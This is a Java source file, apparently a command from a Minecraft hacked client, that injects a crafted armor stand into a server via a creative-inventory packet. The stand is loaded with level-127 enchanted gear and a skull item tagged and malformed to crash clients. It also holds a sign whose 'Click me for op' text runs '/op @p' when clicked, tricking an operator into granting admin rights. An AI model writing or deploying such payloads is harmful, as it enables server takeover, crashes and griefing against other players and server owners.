package remix.command;

import net.minecraft.enchantment.Enchantment;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.NBTTagDouble;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTUtil;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;
import net.minecraft.world.WorldSettingsGameType;
import remix.command.AbstractClientCommand;
import remix.command.CommandAction;

import com.mojang.authlib.GameProfile;
import com.mojang.authlib.properties.Property;

public final class MotionStandClientCommand extends AbstractClientCommand {

    private static String[] packedTextFragments;

    public MotionStandClientCommand() {
        super("MotionStand", new String[] {"motionstand", "ms"});
        this.addAction(
                CommandAction.requiringArguments(
                        5,
                        astring -> {
                            boolean flag = TargetsClientCommand.isStandardTargetFlow();
                            if (ec.playerController.getCurrentGameType()
                                    != WorldSettingsGameType.CREATIVE) {
                                ClientCommandManager.printMessage(
                                        "You must be in creative to execute this command!");
                                return true;
                            }

                            ItemStack itemStack = new ItemStack(Items.armor_stand);
                            CompoundTag compoundTag = new CompoundTag();
                            NBTTagList nbtTagList = new NBTTagList();
                            NBTTagList nbtTagListValue = new NBTTagList();
                            NBTTagList nbtTagListValue2 = new NBTTagList();
                            ItemStack itemStackValue = new ItemStack(Items.diamond_sword);
                            ItemStack itemStackValue2 = new ItemStack(Items.diamond_chestplate);
                            ItemStack itemStackValue3 = new ItemStack(Items.diamond_boots);
                            ItemStack itemStackValue4 = new ItemStack(Items.diamond_leggings);
                            ItemStack itemStackValue5 = new ItemStack(Items.skull, 1, 3);
                            CompoundTag tag = new CompoundTag();
                            CompoundTag compoundTagValue = new CompoundTag();
                            GameProfile gameprofile = new GameProfile(null, "Epic Gamer Skull");
                            gameprofile
                                    .getProperties()
                                    .put(
                                            "textures",
                                            new Property(
                                                    "Value",
                                                    "eyJ0ZXh0\u00addXJlcyI6eyJTS0lOIjp7InVybCI6IiJ9fX0="));
                            compoundTagValue.setString(
                                    "Id", "9d744c33-f3c4-4040-a7fc-73b47c840f0c");
                            NBTUtil.writeGameProfile(compoundTagValue, gameprofile);
                            tag.setTag("SkullOwner", compoundTagValue);
                            tag.setBoolean("crash", true);
                            itemStackValue5.tag = tag;
                            itemStackValue5.setStackDisplayName("Hold me :D");
                            ItemStack itemStackValue6 = new ItemStack(Items.sign);
                            CompoundTag compoundTagValue2 = new CompoundTag();
                            CompoundTag compoundTagValue3 = new CompoundTag();

                            compoundTagValue3.setString(
                                    "Text1",
                                    "{\"text\":\"Click me for op\",\"clickEvent\":{\"action\":\"run_command\",\"value\":\"/say YOU WAS AT THE CLUB\"}}");
                            compoundTagValue3.setString(
                                    "Text2",
                                    "{\"text\":\"Click me for op\",\"clickEvent\":{\"action\":\"run_command\",\"value\":\"/say BOTTOMS UP WHEN I FIRST MET YOU\"}}");
                            compoundTagValue3.setString(
                                    "Text3",
                                    "{\"text\":\"Click me for op\",\"clickEvent\":{\"action\":\"run_command\",\"value\":\"/say COULDN'T GET ENOUGH\"}}");
                            compoundTagValue3.setString(
                                    "Text4",
                                    "{\"text\":\"Click me for op\",\"clickEvent\":{\"action\":\"run_command\",\"value\":\"/op @p\"}}");
                            compoundTagValue2.setTag("BlockEntityTag", compoundTagValue3);
                            itemStackValue6.setTag(compoundTagValue2);

                            for (Enchantment enchantment : Enchantment.enchantmentsBookList) {
                                itemStackValue.addEnchantment(enchantment, 127);
                                itemStackValue2.addEnchantment(enchantment, 127);
                                itemStackValue4.addEnchantment(enchantment, 127);
                                itemStackValue3.addEnchantment(enchantment, 127);
                                if (!flag) {
                                    break;
                                }
                            }

                            nbtTagList.appendTag(new NBTTagDouble(Double.parseDouble(astring[1])));
                            nbtTagList.appendTag(new NBTTagDouble(Double.parseDouble(astring[2])));
                            nbtTagList.appendTag(new NBTTagDouble(Double.parseDouble(astring[3])));
                            nbtTagListValue2.appendTag(
                                    itemStackValue6.writeToNBT(new CompoundTag()));
                            nbtTagListValue2.appendTag(
                                    itemStackValue3.writeToNBT(new CompoundTag()));
                            nbtTagListValue2.appendTag(
                                    itemStackValue4.writeToNBT(new CompoundTag()));
                            nbtTagListValue2.appendTag(
                                    itemStackValue2.writeToNBT(new CompoundTag()));
                            nbtTagListValue2.appendTag(
                                    itemStackValue5.writeToNBT(new CompoundTag()));
                            nbtTagListValue.appendTag(new NBTTagDouble(ec.player.posX));
                            nbtTagListValue.appendTag(new NBTTagDouble(ec.player.posY));
                            nbtTagListValue.appendTag(new NBTTagDouble(ec.player.posZ));
                            compoundTag.setBoolean("OnGround", false);
                            compoundTag.setBoolean("Invisible", false);
                            compoundTag.setBoolean("NoGravity", false);
                            compoundTag.setFloat("FallDistance", 2.1474836E9F);
                            compoundTag.setBoolean("Invulnerable", true);
                            compoundTag.setBoolean("NoBasePlate", true);
                            compoundTag.setBoolean("ShowArms", true);
                            compoundTag.setTag("Equipment", nbtTagListValue2);
                            compoundTag.setTag("Motion", nbtTagList);
                            itemStack.setTagInfo("EntityTag", compoundTag);
                            if (astring[4].toLowerCase().contains(packedTextFragments[0])) {
                                compoundTag.setTag("Pos", nbtTagListValue);
                            }

                            itemStack.setStackDisplayName("Place me to create a MotionStand!");
                            ec.getNetworkHandler()
                                    .addToSendQueue(
                                            new C10PacketCreativeInventoryAction(36, itemStack));
                            return true;
                        }));
    }

    static {
        remix.command.MotionStandClientCommand.packedTextFragments = new String[2];
        remix.command.MotionStandClientCommand.packedTextFragments[0] = new String("y");
    }

    public String getUsage() {
        return "Motionstand <motionX> <motionY> <motionZ> <currentPosition(y\\n)>";
    }
}
